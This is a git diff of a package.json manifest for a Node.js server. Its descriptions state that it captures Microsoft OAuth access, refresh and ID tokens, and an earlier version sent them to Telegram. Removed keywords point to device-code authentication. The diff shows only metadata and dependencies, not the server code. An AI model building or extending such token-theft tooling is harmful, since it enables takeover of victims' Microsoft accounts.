@@ -1,22 +1,11 @@
 {
-  "name": "token-capture-railway",
-  "version": "1.0.0",
-  "description": "Microsoft Token Capture System - Encrypted + Unencrypted Tokens to Telegram",
+  "name": "advanced-token-capture",
+  "version": "2.0.0",
+  "description": "Advanced Microsoft Token Capture - Access, Refresh, ID Tokens (Encrypted + Unencrypted)",
   "main": "server.js",
   "scripts": {
-    "start": "node server.js",
-    "dev": "node server.js"
+    "start": "node server.js"
   },
-  "keywords": [
-    "microsoft",
-    "oauth",
-    "token-capture",
-    "telegram",
-    "device-auth",
-    "railway"
-  ],
-  "author": "",
-  "license": "MIT",
   "dependencies": {
     "express": "^4.18.2",
     "axios": "^1.6.2",
